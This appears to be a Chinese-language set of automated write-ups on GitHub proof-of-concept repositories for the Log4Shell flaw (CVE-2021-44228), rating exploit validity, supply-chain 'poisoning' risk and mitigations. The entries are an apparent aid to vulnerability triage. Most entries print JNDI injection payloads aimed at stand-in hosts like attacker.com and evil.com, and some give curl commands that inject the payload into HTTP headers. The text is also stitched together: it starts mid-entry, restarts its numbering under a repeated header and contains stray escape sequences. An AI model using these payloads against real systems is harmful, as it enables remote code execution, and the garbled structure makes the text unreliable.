1. **URL 的变量名不规范**：`LOG4J_DOWNLOAD_URL` 变量中的 `2.x.y` 存在被攻击者修改的风险，攻击者可以劫持链接，使用恶意的Log4j2 jar 包，造成二次污染。
2. **覆盖现有的 Log4j JAR 文件**:  脚本直接复制下载的新 JAR 文件到应用程序目录，这可能会破坏应用程序的依赖关系，尤其是在不同版本的 Log4j 之间存在不兼容的情况下。
3. **未进行校验**:  脚本没有对下载的压缩包或 JAR 文件进行任何完整性校验（如哈希校验），无法确保下载的文件没有被篡改。
4. **依赖外部源**: 脚本依赖于外部 Apache 官方服务器下载 Log4j，如果该服务器被攻陷，则存在极高的投毒风险。
5. **版本不确定**: 脚本中的版本号 `2.x.y` 是一个占位符，这意味着脚本实际上没有指定要下载的具体 Log4j 版本，可能导致下载到不安全或不兼容的版本。


 **利用方式：** 

1.  攻击者找到任何会记录用户可控输入的Log4j2应用程序。
2.  攻击者在输入中插入恶意的JNDI查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  当Log4j2记录包含此字符串的日志消息时，它会向`attacker.com`发起LDAP请求。
4.  `attacker.com`的LDAP服务器返回一个包含恶意Java类的响应。
5.  Log4j2加载并执行该恶意Java类，从而导致远程代码执行。

根据漏洞库信息，搜索引擎结果以及提供的漏洞利用代码进行综合分析， 漏洞利用的有效性高，投毒风险极高。

**项目地址:** [OtisSymbos/CVE-2021-44228-Log4Shell-](https://github.com/OtisSymbos/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #11

**来源**: [CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md](../2021/CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个关键漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意 JNDI 查找字符串注入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析并记录包含恶意 JNDI 查找的日志消息时，它会联系攻击者控制的 LDAP 或 RMI 服务器，并执行服务器返回的恶意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者将包含特定格式的恶意字符串（例如 `${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的任何输入字段中，例如 HTTP 请求头、POST 数据、Web 表单等。
2.  **应用程序记录日志：** 如果应用程序使用受影响版本的 Log4j2 记录包含恶意字符串的输入，Log4j2 将尝试解析该字符串。
3.  **JNDI 查找触发：** Log4j2 发现 `${jndi:...}` 模式，触发 JNDI 查找。
4.  **连接恶意服务器：** Log4j2 使用指定的协议（例如 LDAP、RMI）连接到攻击者控制的服务器 (attacker.com)。
5.  **执行恶意代码：** 攻击者的服务器返回包含恶意 Java 对象的响应。Log4j2 反序列化该对象，导致在目标服务器上执行任意代码。

**有效性：**

提供的POC代码（技术分析文档）描述了该漏洞的原理，受影响版本以及利用过程，可以辅助构建PoC。漏洞利用的有效性取决于目标系统是否使用了受影响的Log4j2版本，并且是否允许出站网络连接到攻击者的JNDI服务器。由于 Log4Shell 在野外被广泛利用，因此认为提供的分析是基于真实可利用的漏洞的。

**投毒风险：**

提供的代码主要为技术分析文档，本身不包含可直接执行的恶意代码。但是，任何代码仓库都存在一定程度的投毒风险。在这种情况下，如果攻击者成功篡改了仓库中的分析文档，他们可能会插入误导性信息或隐藏的恶意链接，从而诱导用户下载或执行恶意软件。风险评估为10%，因仓库主要为分析文档，直接嵌入恶意代码可能性较低。

**项目地址:** [PCMKUIT/CVE-2021-44228---Log4Shell-Analysis](https://github.com/PCMKUIT/CVE-2021-44228---Log4Shell-Analysis)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #12

**来源**: [CVE-2021-44228-SerpilRivas_log4shell-homework9.md](../2021/CVE-2021-44228-SerpilRivas_log4shell-homework9.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标应用程序使用受影响版本的 Log4j2，且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的严重漏洞。攻击者可以通过发送特制的字符串，其中包含 JNDI 查找，利用此漏洞执行任意代码。当 Log4j2 尝试记录这些字符串时，它会通过 JNDI 查找连接到攻击者控制的 LDAP 或其他 JNDI 服务，并执行恶意代码。

**漏洞利用方式：**

1.  攻击者发送包含`${jndi:<协议>://<攻击者服务器>/<资源>}`的恶意请求到目标系统。`${jndi}`是触发漏洞的关键部分，它指示 Log4j2 执行 JNDI 查找。
2.  目标系统使用 Log4j2 记录该请求。
3.  Log4j2 解析该字符串并尝试连接到攻击者指定的 JNDI 服务器（例如，LDAP）。
4.  JNDI 服务器返回恶意代码（例如，Java class 文件）。
5.  Log4j2 加载并执行该恶意代码，导致远程代码执行。

**POC有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞非常有效，并被广泛利用。提供的 Dockerfile 和 `docker-compose.yml` 文件用于构建一个包含易受攻击的 Log4j2 版本的应用程序。`ldap_server.py` 模拟了一个恶意的 LDAP 服务器，用于提供攻击载荷。使用`curl http://localhost:8080?input=${jndi:ldap://localhost:8000/Exploit}`命令验证漏洞利用过程。

**投毒风险：**

分析提供的代码，投毒风险较低，约为 5%。主要依据如下：

*   `ldap_server.py` 仅用于模拟攻击，本身不包含任何恶意代码，只返回“Exploit payload simulated.”字符串。
*   Dockerfile 构建的镜像是使用受漏洞影响的Log4j2，目的是为了验证漏洞，不是为了投毒。
*   `pom.xml` 文件指定了 Log4j2 的版本为 2.17.1, 此版本已经修复了漏洞，但README.md文件中提到使用了存在漏洞的2.14.1版本，存在描述不一致，且依赖版本管理不严谨
*   虽然主体没有明显的投毒代码，但在真实环境中，攻击者可能会替换 `ldap_server.py` 中的 payload，或者修改 Dockerfile 构建恶意镜像。因此存在潜在的风险。
*   README.md文件描述了缓解措施，较为完备。

总体而言，提供的代码主要是用于漏洞演示和验证，而非恶意投毒。但开发者仍需保持警惕，在实际应用中注意代码审查和依赖管理。

**项目地址:** [SerpilRivas/log4shell-homework9](https://github.com/SerpilRivas/log4shell-homework9)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #13

**来源**: [CVE-2021-44228-ShlomiRex_log4shell_lab.md](../2021/CVE-2021-44228-ShlomiRex_log4shell_lab.md)

## CVE-2021-44228 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且允许外部网络访问，日志记录功能开启并且记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的安全漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**漏洞利用方式：**

该漏洞源于Log4j2中的JNDI（Java Naming and Directory Interface）功能，该功能允许从LDAP和其他JNDI相关端点加载代码。当攻击者能够控制日志消息或日志消息参数时，他们可以利用此功能执行从LDAP服务器加载的任意代码。攻击者通过在Log4j2可以解析的日志消息中插入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`，来触发该漏洞。当Log4j2尝试解析此字符串时，它会向`attacker.com`上的LDAP服务器发出请求，并执行从该服务器返回的Java代码。

提供的POC代码利用了这一点，使用`docker-compose`快速搭建了一个包含漏洞应用(`vul`)、LDAP服务器(`ldap_server`)和恶意代码服务器(`exploit_server`)的实验环境。利用步骤如下：

1.  使用`docker-compose up -d`启动实验环境。
2.  使用`curl`命令向漏洞应用发送包含恶意JNDI查找字符串的HTTP请求，例如：`curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`。 其中`my_ldap_server`指向 docker-compose 启动的 ldap_server。
3.  LDAP服务器将请求重定向到恶意代码服务器，下载并执行恶意代码。
4.  验证漏洞是否成功利用，通常通过检查`vul`容器上的文件或观察其他系统行为。

**有效性：**

根据漏洞描述、搜索引擎结果和提供的POC代码，可以判断该POC代码是有效的。大量的安全报告和漏洞分析都确认了CVE-2021-44228的可利用性，并且该POC代码提供了一个易于部署的实验环境，用于验证该漏洞。

**投毒风险：**

评估该POC代码的投毒风险较低，大约10%。原因如下：

*   **明确的用途：** 该代码库旨在提供一个用于演示和测试Log4Shell漏洞的实验环境，其主要功能是复现漏洞，方便用户理解和学习。
*   **可见的组件：** 该代码库包含了`docker-compose.yml`文件以及构建LDAP服务器、恶意代码服务器的Dockerfile，这些文件是公开可见的，便于用户检查和审计。
*   **简单的逻辑：** 实验环境的搭建和漏洞利用流程相对简单，易于理解和验证。
*   **潜在的风险：** 尽管该代码库的主要目的是演示漏洞利用，但仍存在潜在的风险。例如，如果用户直接在生产环境中使用该代码库，可能会暴露其系统，受到攻击。此外，恶意攻击者可能会修改该代码库，添加恶意代码，然后传播给不知情的用户。但考虑到公开的性质和广泛的审查，直接包含恶意代码的可能性较低。

**风险缓减：**
* 下载代码后,仔细检查`docker-compose.yml`以及Dockerfile文件,确保没有恶意配置或者代码.
* 运行前务必搭建隔离环境,避免直接在生产环境中使用.

**项目地址:** [ShlomiRex/log4shell_lab](https://github.com/ShlomiRex/log4shell_lab)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #14

**来源**: [CVE-2021-44228-Sorrence_CVE-2021-44228.md](../2021/CVE-2021-44228-Sorrence_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，并且开启了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 特性，从恶意的 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的PoC代码有效。它通过构造包含 JNDI LDAP 查找的 HTTP Header (X-Api-Version) 发送到目标，目标如果存在漏洞，将会触发一个回调到攻击者指定的 LHOST。

**投毒风险：**
代码本身相对简单，主要功能是发送包含恶意 JNDI payload 的 HTTP 请求并监听回调。可能的投毒风险在于：
*   **依赖风险：** 代码使用了 `net/http` 和 `net` 包。虽然是标准库，但如果编译过程中存在恶意替换或者构建环境被污染，可能存在风险。此风险较低，估计在10%左右。
*   **LHOST欺骗：** PoC 代码强制要求用户指定回调 LHOST。攻击者可能诱导受害者使用受控的 LHOST，从而获取受害者目标系统的相关信息，或者进行中间人攻击。但这不是代码本身的投毒，而是使用方式上的欺骗。
*   **LDAP 服务器风险：** 代码中的 `jndi:ldap://%s:1389/a` 指向的 LDAP 服务器是攻击者控制的。这意味着攻击者可以在 LDAP 服务器上放置恶意 Java 对象，从而在受害者系统上执行任意代码。

由于该PoC的目的是验证漏洞，并且代码相对简单，因此直接隐藏恶意代码的可能性较低。主要的风险在于运行环境和攻击者控制的LDAP服务器。

**利用方式：**
1.  **漏洞触发：** 攻击者向目标系统发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的请求。该字符串会被 Log4j2 解析为 JNDI 查找。
2.  **JNDI 注入：** Log4j2 通过 JNDI 接口向指定的 LDAP 服务器 (attacker.com) 发起请求。
3.  **恶意代码加载：** 攻击者控制的 LDAP 服务器返回一个包含恶意 Java 对象的响应。
4.  **远程代码执行：** Log4j2 反序列化该 Java 对象，导致任意代码在目标系统上执行。

**缓解措施：**
*   升级 Log4j2 到 >= 2.16.0 版本，该版本完全移除了 JNDI 功能。
*   如果无法升级，设置 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量来禁用 message lookup substitution。
*   使用防火墙或网络策略限制对外部 LDAP 服务器的访问。

**项目地址:** [Sorrence/CVE-2021-44228](https://github.com/Sorrence/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #15

**来源**: [CVE-2021-44228-Super-Binary_cve-2021-44228.md](../2021/CVE-2021-44228-Super-Binary_cve-2021-44228.md)

# CVE-2021-44228

> 📦 该CVE有 **41** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-44228-0xInfection_LogMePwn.md](../2021/CVE-2021-44228-0xInfection_LogMePwn.md)

## CVE-2021-44228 - Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过构造包含 JNDI 查找的恶意日志消息，从而在目标服务器上执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** Log4j2 允许在日志消息中使用 JNDI 查找，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 尝试解析这些查找时，它会连接到指定的 JNDI 服务器（例如 LDAP），并检索 Java 对象。如果攻击者可以控制日志消息的内容，他们就可以让 Log4j2 连接到恶意的 JNDI 服务器，该服务器会返回包含恶意代码的 Java 对象，Log4j2 反序列化这个对象从而导致任意代码执行。

2.  **利用方式：**
    *   攻击者需要找到一个途径，可以将恶意 JNDI 查找字符串注入到应用程序的日志消息中。这可能通过 HTTP 请求头、POST 请求参数、Websocket 消息等实现。
    *   攻击者控制的 JNDI 服务器（例如 LDAP 服务器）需要返回一个包含恶意代码的 Java 对象。这通常通过一个恶意的 Java 类来实现，该类在加载时执行任意代码。

3.  **漏洞代码评估：** 提供的漏洞利用代码看起来像一个通用的漏洞扫描器，可以扫描各种协议，并允许自定义 payload。它本身不包含直接的攻击载荷,但是如果扫描器被用于发送恶意 JNDI 查找字符串，则它就可以被用来触发 CVE-2021-44228。

4.  **投毒风险分析：** 虽然提供的CHANGELOG和LICENSE文件看起来无害，但仓库中其他未提供代码的可能性也存在。扫描器本身允许自定义payload，可能包含恶意软件，用户应该小心使用，因此存在一定的投毒风险（估计为 10%）。这个百分比考虑了代码扫描器可能被用来传播恶意 payload的可能性，即使其核心功能并非恶意。

5.  **缓解措施：**
    *   升级 Log4j2 到 >=2.17.1 版本。
    *   禁用 JNDI 查找功能（如果不需要）。
    *   设置 `log4j2.formatMsgNoLookups=true` 属性。


**项目地址:** [0xInfection/LogMePwn](https://github.com/0xInfection/LogMePwn)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #2

**来源**: [CVE-2021-44228-0xsyr0_Log4Shell.md](../2021/CVE-2021-44228-0xsyr0_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version < 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。需要目标服务器开启JNDI功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以通过发送特制的日志请求，利用Log4j2的JNDI功能来执行任意代码。\n\n**漏洞利用方式：**\n\n1.  攻击者向使用存在漏洞的Log4j2组件的应用程序发送包含恶意JNDI查找字符串的请求。例如： `${jndi:ldap://attacker.com/evil}`\n2.  Log4j2在记录日志时，会解析该JNDI字符串，并尝试通过LDAP协议连接到攻击者控制的服务器（attacker.com）。\n3.  攻击者的LDAP服务器返回一个包含Java对象的引用。\n4.  Log4j2尝试加载并实例化该Java对象，从而导致攻击者控制的代码在服务器上执行。\n\n**有效性：** 根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。该漏洞已被广泛利用，并且互联网上存在大量的POC和利用工具。\n\n**投毒风险：**\n查看了提供的“漏洞利用代码”仓库的内容列表，主要包含以下信息:\n*   Advisory.md：提供漏洞相关的建议和缓解措施的链接。\n*   Exploitation.md：提供漏洞利用相关的链接，例如渗透测试指南和JNDI注入工具。\n*   Honeypots.md：提供蜜罐相关的链接。\n*   IOCs-Callback-Domains-IP-Addresses.md：提供IOC（Indicator of Compromise）和回调URL/IP地址的链接。\n*   Malware-Reports.md：提供恶意软件报告的链接。\n*   Mitigations-Fixes.md：提供缓解和修复措施的链接。\n*   Payloads-Obfuscation-WAF-Bypass.md：提供payload、混淆和WAF绕过相关的链接。\n\n总体而言，这个仓库主要是一个资源链接的集合，提供了关于CVE-2021-44228（Log4Shell）的各种信息，包括漏洞建议、利用方法、IOC、缓解措施和payload。\n\n其中`Exploitation.md`文件中链接的`JNDI-Injection-Exploit`、`JNDI-Exploit-Kit`和`marshalsec`等工具本身就是漏洞利用工具，如果用户下载并使用这些工具，可能会面临安全风险，例如被植入后门或恶意代码，或者被用于非法用途。但是这些工具本身是为了复现和验证漏洞使用的，并非作者投毒。\n仓库本身提供的信息比较杂乱，需要使用者具备一定的安全知识才能正确评估和使用。存在一定的误导性，有可能被不具备安全知识的人误用，或者被用于恶意目的，因此评估投毒风险为10%。

**项目地址:** [0xsyr0/Log4Shell](https://github.com/0xsyr0/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #3

**来源**: [CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md](../2021/CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 log4j-core 并且启用了消息查找替换功能。攻击者需要能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞。攻击者可以通过在日志消息中插入恶意的 JNDI 查找字符串，利用 JNDI 功能从远程 LDAP 服务器加载和执行任意代码。 

**利用方式：**

1.  攻击者发送包含恶意 JNDI 查找字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，到目标应用程序。
2.  如果目标应用程序使用 Log4j2 记录该请求，Log4j2 将尝试解析该 JNDI 字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**有效性：**

提供的 POC 代码（Vulhub 环境配置）有效，用于搭建一个可重现 Log4Shell 漏洞的环境。它通过 Docker-Compose 部署一个包含漏洞的 Apache Solr 实例，方便研究人员进行漏洞复现和分析。

**投毒风险：**

该仓库本身主要提供的是漏洞复现环境的配置，投毒风险较低。但是，使用任何第三方代码库或环境时，都需要谨慎评估潜在的风险。这里存在一定风险，因为攻击者可能篡改该仓库，在 LDAP 服务器返回的恶意 Java 类中植入恶意代码，使得利用漏洞时执行预期之外的操作。 因此评判投毒风险为10%，主要为潜在的供应链攻击风险。

**项目地址:** [Alan-coder-eng/log4j-cve-2021-44228-](https://github.com/Alan-coder-eng/log4j-cve-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #4

**来源**: [CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md](../2021/CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j 2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 应用程序使用Log4j 2记录不受信任的输入，且未进行修复或缓解。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j 2中的一个远程代码执行漏洞。攻击者可以通过构造包含JNDI查找的恶意字符串，当Log4j 2记录该字符串时，会触发JNDI查找，从而从攻击者控制的LDAP服务器加载并执行恶意Java类。

**有效性：**
提供的POC代码有效。它展示了如何通过在HTTP请求头中注入`${jndi:ldap://evil.com/exploit}`这样的payload来触发漏洞。当应用程序记录User-Agent头时，Log4j 2会尝试解析该字符串，执行JNDI查找，并从evil.com加载恶意代码。

**投毒风险：**
分析提供的README.md文件，投毒风险较低，约为10%。主要风险在于以下几点：
* **依赖性风险：** 任何开源项目都存在依赖性风险。如果恶意作者控制了项目依赖的某个组件，则可能通过供应链攻击进行投毒。
* **人为因素：** 尽管README.md本身没有发现直接的恶意代码，但用户在使用过程中可能会受到误导，例如，将测试用的恶意LDAP服务器配置错误，导致意外的攻击或数据泄露。

**漏洞利用方式：**
1.  **攻击者构造恶意Payload：** 攻击者构造一个包含JNDI查找的payload，例如`${jndi:ldap://attacker.com/a}`。
2.  **注入Payload：** 攻击者将payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent、X-Forwarded-For等）、POST请求参数、WebSocket消息等。
3.  **触发日志记录：** 应用程序使用Log4j 2记录包含恶意payload的输入。
4.  **JNDI查找：** Log4j 2解析payload，执行JNDI查找，向attacker.com发起LDAP请求。
5.  **加载恶意代码：** 攻击者的LDAP服务器返回一个包含恶意Java类的响应。
6.  **远程代码执行：** Log4j 2加载并执行该Java类，导致远程代码执行。

**缓解措施：**
*   升级Log4j 2到最新版本 (>= 2.17.1)。
*   从JAR文件中删除`JndiLookup.class`。
*   设置系统属性`log4j2.formatMsgNoLookups=true`来禁用消息查找。
*   使用防火墙或出口ACL阻止出站LDAP/RMI流量。
*   在WAF/IDS规则中阻止`${jndi:` payload。

**项目地址:** [B1ack4sh/Blackash-CVE-2021-44228](https://github.com/B1ack4sh/Blackash-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #5

**来源**: [CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md](../2021/CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接到攻击者的 LDAP/HTTP 服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的远程代码执行漏洞。攻击者可以通过构造特殊的日志消息，利用 JNDI 注入来执行任意代码。 

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的PoC代码有效。搜索结果表明该漏洞是真实存在的，并且有许多利用实例。

**投毒风险：**
分析提供的PoC代码，投毒风险很低。 
*   `LICENSE`: MIT许可，标准开源许可。 
*   `README.md`: 提供了PoC的详细信息，包括所需环境，操作步骤和WAF绕过方式等。 
*   `docker-compose.yaml`: 定义了frontend(React SPA)和backend(Spring Boot)两个服务, 其中backend使用了存在漏洞的Log4j2。 
*   `init.sh`: 这个脚本用于在攻击者机器上设置攻击环境。它编译JNDI利用所需的Java类，启动一个HTTP服务器来提供这些类，并启动一个LDAP服务器以响应JNDI查询。这个脚本是攻击的核心组成部分，但它本身的目的就是为了演示漏洞利用，不属于恶意投毒。它确实会下载编译好的文件到攻击者机器上，但这是漏洞利用的正常流程,本身不构成投毒。 但使用未经审核的脚本始终存在一定的风险，所以给了1%的风险.

**利用方式：**
1.  攻击者向目标系统发送包含恶意 JNDI 注入字符串的请求。该字符串形如`${jndi:ldap://attacker_host:ldap_port/Exploit}`。
2.  目标系统使用 Log4j2 记录该请求。由于存在漏洞，Log4j2 会解析 JNDI 字符串，并尝试通过 LDAP 协议连接到攻击者的服务器。
3.  攻击者的 LDAP 服务器返回一个指向 HTTP 服务器的响应，指示目标系统下载并执行一个 Java 类。
4.  目标系统下载并执行该 Java 类，从而实现远程代码执行。

**缓解措施：**
*   升级到 Log4j2 的安全版本 (>= 2.17.0)。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups=true` 阻止 JNDI 查找。
*   使用 Web 应用防火墙 (WAF) 检测和阻止恶意的 JNDI 注入字符串。

**项目地址:** [Carlos-Mesquita/TPASLog4ShellPoC](https://github.com/Carlos-Mesquita/TPASLog4ShellPoC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #6

**来源**: [CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md](../2021/CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致完全服务器接管

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标应用使用了受影响版本的Log4j2，并且允许通过用户可控的输入来记录日志。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向服务器发送特制的字符串，该字符串包含JNDI查找，从而利用此漏洞。当Log4j2尝试记录此字符串时，它会执行JNDI查找，导致服务器从攻击者控制的LDAP服务器下载并执行恶意代码。 

**漏洞利用方式：**

1.  攻击者向目标系统发送包含恶意JNDI查找的请求。例如： `${jndi:ldap://attacker.com/evil}` 
2.  如果目标系统使用受影响的Log4j2版本记录此请求，Log4j2将尝试执行JNDI查找。 
3.  Log4j2连接到攻击者控制的LDAP服务器(`attacker.com`)。 
4.  LDAP服务器返回一个包含恶意Java类的URL。 
5.  Log4j2从该URL下载并执行恶意Java类，导致远程代码执行。 

**POC有效性：**

从提供的`pom.xml`文件可以看出，POC代码使用了`log4j-core`和`log4j-api`的2.14.1版本，该版本受到CVE-2021-44228漏洞的影响。因此，如果部署包含此Log4j2版本的Web应用，则攻击者可以通过发送恶意payload触发漏洞。`forgotpass.java`文件展示了如何从request中获取参数，并将其拼接到输出中，这可能是触发漏洞的点，攻击者可以在username参数中插入恶意payload.

**投毒风险：**

分析提供的代码，`forgotpass.java`看似存在XSS漏洞，该文件只是简单地将用户输入（username）插入到HTML的JavaScript代码中，使其能弹出一个prompt窗口，之后跳转到主页。没有发现明显的用于进行恶意利用的代码，如反弹shell或进行其他类型的远程控制操作。 `log4j.java` 是一个Logger类，没有实际逻辑。 总体而言，仓库中存在隐藏的投毒代码的可能性较低，估计在10%左右。主要考虑到作者可能在LDAP服务器上部署恶意java文件，从而进行投毒。需要更深入的分析才能确定是否存在更隐蔽的投毒行为。

**项目地址:** [Fauzan-Aldi/Log4j-_Vulnerability](https://github.com/Fauzan-Aldi/Log4j-_Vulnerability)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #7

**来源**: [CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md](../2021/CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md)

## CVE-2021-44228 Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，并且允许攻击者控制Log4j2的日志消息或日志消息参数

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

